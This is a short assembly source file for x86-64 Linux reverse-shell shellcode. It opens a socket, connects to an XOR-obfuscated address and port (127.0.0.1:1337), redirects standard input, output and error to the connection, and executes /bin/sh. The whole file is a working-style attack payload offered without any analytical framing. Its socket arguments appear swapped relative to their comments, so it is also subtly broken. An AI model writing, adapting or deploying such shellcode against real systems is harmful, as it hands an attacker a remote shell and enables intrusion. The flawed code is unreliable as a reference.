BITS 64


; socket()
xor		rax,rax		; zero out rax (SYSCALL NMB)
xor		rdi,rdi		;   "   "  rdi (ARG0)
xor		rsi,rsi		;   "   "  rsi (ARG1)
mov		rdx,rax		;   "   "  rdx (ARG2)
mov byte	al,41		; socketcall syscall
mov byte	dil,0x1		; SOCKTYPE
mov byte	sil,0x2		; SOCKDOMAIN
syscall

mov		rdi,rax

; connect()
xor		rax,rax
push		rax
push		rax
push dword	0x1011116E	; XOR-encoded -> 127.0.0.1
xor dword	[rsp],0x11111111
push word	0x2814          ; push tcp port (XOR-encoded -> 1337)
xor word	[rsp],0x1111 ; decode tcp port
push word	0x2    ; 0x2 -> AF_INET
mov		rsi,rsp
mov		dl,0x10
mov		al,42
syscall

; dup2()
xor		rdx,rdx
mov		dl,0x3
dupes:
mov		rsi,rdx
dec		rsi
xor		rax,rax
mov		al,0x21
syscall
dec		dl
jnz dupes

; exec
mov		rax,0x68732f6e69622f2f  ; string 'hs/nib//'
push		rax
xor		rax,rax
mov byte	[rsp + 8],al
mov		rdi,rsp
push		rax
mov		rsi,rsp
push		rax
mov		rdx,rsp
mov		al,0x3b
syscall

